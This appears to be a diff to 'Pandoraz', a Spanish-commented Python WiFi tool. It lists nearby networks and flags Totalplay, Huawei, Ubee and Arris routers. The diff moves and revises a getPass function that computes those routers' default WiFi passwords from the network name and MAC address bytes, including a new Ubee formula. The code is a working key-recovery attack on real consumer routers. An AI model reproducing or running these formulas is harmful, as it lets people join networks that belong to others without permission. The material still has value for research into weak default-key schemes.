@@ -9,7 +9,7 @@
 #   ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
 #   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
 #                                                         By: LawlietJH
-#                                                               v1.6.4
+#                                                               v1.6.6
 #                                                               vex1.1
 # vex = Versión Exe.
 
@@ -30,7 +30,7 @@ import os
 
 
 
-Version = "v1.6.4 - vex1.1"
+Version = "v1.6.6 - vex1.1"
 GitHub = "https://github.com/LawlietJH/Pandoraz"
 
 B_PANDORA1, B_Z1 = "      ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ", "███████╗"
@@ -117,7 +117,6 @@ def Ctrl_C():
 
 
 
-
 #=======================================================================
 
 
@@ -132,6 +131,55 @@ Pwd = {}
 Resp = 0
 Tam = 0
 Eny = 0
+
+
+
+#=======================================================================
+
+
+
+def Hex_Dec(Hex):	#~ Hexadecimal a Decimal.
+	
+	xD = ""
+	Hex += " "
+	Lista = []
+	Decimal = ""
+	Hex = Hex.upper()				#~ Pone Todo En Mayusculas.
+	
+	#~ Se Separa la Cadena con un Espacio en Cada Número.
+	for i in Hex:
+		
+		if i != " ": xD = xD + i
+		else: Lista.append(str(eval("0x" + xD)) + " "); xD = ""	#~ Se Añade Cada Número a la Lista.
+	
+	for Dec in Lista: Decimal += Dec	#~ Se Añade Cada Número a la Cadena.
+	
+	return Decimal
+
+
+
+def Dec_Hex(Dec):	#~ Decimal a Hexadecimal.
+	
+	xD = ""
+	Lista = []
+	Hexadecimal = ""
+	
+	for Hex in Dec:
+	
+		if Hex != " ": xD = xD + Hex
+		else:
+			xD = hex(int(xD)).split('x')[1]
+			Lista.append(xD+" ")
+			xD = ""
+	
+	xD = hex(int(xD)).split('x')[1]
+	Lista.append(xD)
+	
+	for Hexa in Lista: Hexadecimal += Hexa
+	
+	Hexadecimal = Hexadecimal.upper()
+	
+	return Hexadecimal
 
 
 
@@ -182,7 +230,7 @@ def Chk_WiFi(Cadena):
 				if Resp == "": print("\n\n\t ", end=""), Mark("!"), color("VC"), print(" Elige Una Opción!"), Sleep(1)
 				else:
 					
-					if Resp == b"\x03": Dat(), Salir(0)
+					if Resp == "\x03": Dat(), Salir(0)
 					
 					if int(Resp) > 1: Inter += " " + str(int(Resp))
 					
@@ -287,8 +335,6 @@ def ObtenerRedes():
 			x = x.split(" : ")[1]
 			
 			if Cont == 1:
-				
-				#~ if x == "Totalplay-003D": x = "Totalplay-003D_00000"
 				
 				ESSID.append(x)
 				Tam += 1
@@ -430,6 +476,8 @@ def ImprimirListaWifi(Datos):
 		color("AZ"), print(" |", end="")
 		color("R"), print("\n =============================================================================\n")
 		
+		if Tam == 0: print("\n\n\t ", end=""), Mark("!"), color("RC"), print(" Sin Redes Disponibles... Por Ahora...\n\n")
+			
 		for x in range(Tam):
 			
 			if x < 9:
@@ -438,8 +486,7 @@ def ImprimirListaWifi(Datos):
 					
 					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
 					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
-					or ("Ubee" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 8)\
-					or "Huawei" in Datos["ESSID"][Cont]:
+					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
 						color("BB"), print(" *", end="")
 						color("RC"), print(" {}".format(x+1), end=""), color("AZC"), print(" - ", end="")
 						color("VC"), print("{}".format(Datos["ESSID"][Cont]), end=" "*(20-len(Datos["ESSID"][Cont])))
@@ -462,8 +509,7 @@ def ImprimirListaWifi(Datos):
 					
 					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
 					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
-					or ("Ubee" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 8)\
-					or "Huawei" in Datos["ESSID"][Cont]:
+					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
 						MAC = Datos["BSSID"][Cont].split(":")
 						for byte in MAC:
 							Con+=1; color("VC"), print(byte, end=""),
@@ -486,8 +532,7 @@ def ImprimirListaWifi(Datos):
 					
 					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
 					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
-					or ("Ubee" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 8)\
-					or "Huawei" in Datos["ESSID"][Cont]:
+					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
 						color("BB"), print(" *", end="")
 						color("RC"), print(" {}".format(x+1), end=""), color("AZC"), print(" - ", end="")
 						color("VC"), print("{}\n".format(Datos["ESSID"][Cont]), end=" "*27)
@@ -510,8 +555,7 @@ def ImprimirListaWifi(Datos):
 					
 					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
 					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
-					or ("Ubee" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 8)\
-					or "Huawei" in Datos["ESSID"][Cont]:
+					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
 						MAC = Datos["BSSID"][Cont].split(":")
 						for byte in MAC:
 							Con+=1; color("VC"), print(byte, end=""),
@@ -535,8 +579,7 @@ def ImprimirListaWifi(Datos):
 					
 					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
 					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
-					or ("Ubee" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 8)\
-					or "Huawei" in Datos["ESSID"][Cont]:
+					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
 						color("BB"), print(" *", end="")
 						color("RC"), print("{}".format(x+1), end=""), color("AZC"), print(" - ", end="")
 						color("VC"), print("{}".format(Datos["ESSID"][Cont]), end=" "*(20-len(Datos["ESSID"][Cont])))
@@ -559,8 +602,7 @@ def ImprimirListaWifi(Datos):
 					
 					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
 					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
-					or ("Ubee" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 8)\
-					or "Huawei" in Datos["ESSID"][Cont]:
+					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
 						MAC = Datos["BSSID"][Cont].split(":")
 						for byte in MAC:
 							Con+=1; color("VC"), print(byte, end=""),
@@ -583,8 +625,7 @@ def ImprimirListaWifi(Datos):
 					
 					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
 					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
-					or ("Ubee" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 8)\
-					or "Huawei" in Datos["ESSID"][Cont]:
+					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
 						color("BB"), print(" *", end="")
 						color("RC"), print("{}".format(x+1), end=""), color("AZC"), print(" - ", end="")
 						color("VC"), print("{}\n".format(Datos["ESSID"][Cont]), end=" "*27)
@@ -607,8 +648,7 @@ def ImprimirListaWifi(Datos):
 					
 					if ("Totalplay" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 14)\
 					or ("TOTALPLAY" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 16)\
-					or ("Ubee" in Datos["ESSID"][Cont] and len(Datos["ESSID"][Cont]) == 8)\
-					or "Huawei" in Datos["ESSID"][Cont]:
+					or "Ubee" in Datos["ESSID"][Cont] or "Huawei" in Datos["ESSID"][Cont]:
 						MAC = Datos["BSSID"][Cont].split(":")
 						for byte in MAC:
 							Con+=1; color("VC"), print(byte, end=""),
@@ -693,6 +733,72 @@ def getNameRedes(Datos, Pos):
 			#~ Redes.append(Datos["Canal"][Pos])
 			#~ Redes.append(Datos["BSSID"][Pos])
 
+
+
+def getPass(Nombre, MAC):
+	
+	Nomb1, Nomb2 = "", ""
+	Pass = ""
+	xD = ""
+	
+	if "Totalplay" in Nombre:	# Para redes Totalplay de 4 Caracteres: Totalplay-XXXX.
+		
+		try: xD = Nombre.split("-")[1]
+		except: Pass = "UNKNOWN"
+		
+		if len(xD) == 4:
+			
+			Nombre = Nombre[-4:]
+			MAC = MAC.split(":")
+			Pass = MAC[3] + MAC[4] + Nombre
+			
+		else: Pass = "UKNOWN"
+	
+	elif "Huawei" in Nombre:		# Para redes Huawei-XXXX-XXXX.
+		
+		try: xD = Nombre.split("-")[2]
+		except: Pass = "UNKNOWN"
+		
+		if len(xD) == 4:
+			
+			Nombre = Nombre[-4:]
+			MAC = MAC.split(":")
+			Pass = MAC[3] + MAC[4] + Nombre
+			
+		else:  Pass = "UKNOWN"
+		
+	elif "TOTALPLAY" in Nombre:	# Para redes Totalplay de 6 Caracteres: TOTALPLAY_XXXXXX.
+		
+		MAC = MAC.split(":")
+		
+		Pass = MAC[3].upper() + MAC[4].upper() + MAC[4].lower() + MAC[5].lower()
+		
+	elif "Ubee" in Nombre:	# Para redes UbeeXXXX de Megacable. 
+		
+		Byte6 = MAC.split(":")[-1]
+		Byte5 = MAC.split(":")[-2]
+		Bytes = Byte5 + Byte6
+		
+		Dec = str(int(Hex_Dec(Bytes))-4)
+		Hex = Dec_Hex(Dec)
+		
+		Pass = ''.join(MAC.split(":")[1:4]) + Hex
+		
+	elif "DG860" in Nombre or "TG862" in Nombre:	# Para Redes Arris DG860XXX/TG862XXX.
+		
+		if len(Nombre) == 8:
+			
+			Nombre1 = Nombre[:6]
+			Nombre2 = Nombre[-2:]
+			MAC = MAC.split(":")
+			Pass = Nombre1 + MAC[3] + MAC[4] + Nombre2
+		
+		else: Pass = "UNKNOWN"
+		
+	return Pass
+
+
+
 def getPassRedes():
 	
 	global Redes, Pwd
@@ -763,71 +869,7 @@ def getPassRedes():
 				
 				Cont = 0
 			
-	else: print("\n\n\t ", end=""), Mark("!"), color("RC"), print(" Sin Redes Disponibles... Por Ahora...")
-
-
-
-def getPass(Nombre, MAC):
-	
-	Nomb1, Nomb2 = "", ""
-	Pass = ""
-	xD = ""
-	
-	if "Totalplay" in Nombre:	# Para redes Totalplay de 4 Caracteres: Totalplay-XXXX.
-		
-		try: xD = Nombre.split("-")[1]
-		except: Pass = "UNKNOWN"
-		
-		if len(xD) == 4:
-			
-			Nombre = Nombre[-4:]
-			MAC = MAC.split(":")
-			Pass = MAC[3] + MAC[4] + Nombre
-			
-		else: Pass = "UKNOWN"
-	
-	elif "Huawei" in Nombre:		# Para redes Huawei-XXXX-XXXX.
-		
-		try: xD = Nombre.split("-")[2]
-		except: Pass = "UNKNOWN"
-		
-		if len(xD) == 4:
-			
-			Nombre = Nombre[-4:]
-			MAC = MAC.split(":")
-			Pass = MAC[3] + MAC[4] + Nombre
-			
-		else:  Pass = "UKNOWN"
-		
-	elif "TOTALPLAY" in Nombre:	# Para redes Totalplay de 6 Caracteres: TOTALPLAY_XXXXXX.
-		
-		MAC = MAC.split(":")
-		
-		Pass = MAC[3].upper() + MAC[4].upper() + MAC[4].lower() + MAC[5].lower()
-				
-	elif "DG860" in Nombre or "TG862" in Nombre:	# Para Redes Arris DG860XXX/TG862XXX.
-		
-		if len(Nombre) == 8:
-			
-			Nombre1 = Nombre[:6]
-			Nombre2 = Nombre[-2:]
-			MAC = MAC.split(":")
-			Pass = Nombre1 + MAC[3] + MAC[4] + Nombre2
-		
-		else: Pass = "UNKNOWN"
-	
-	elif "Ubee" in Nombre:	# Para redes UbeeXXXX de Megacable. 
-		
-		if len(Nombre) == 8:
-			
-			MAC = MAC.split(":")
-			Nomb1 = MAC[1] + MAC[2] + MAC[3]
-			Nomb2 = Nombre[-4:]
-			
-			Pass = Nomb1 + Nomb2
-			Pass = Pass.upper()
-		
-	return Pass
+	else: print("\n\n\t ", end=""), Mark("!"), color("RC"), print(" Sin Contraseñas Conseguidas... Por Ahora...")
 
 
 
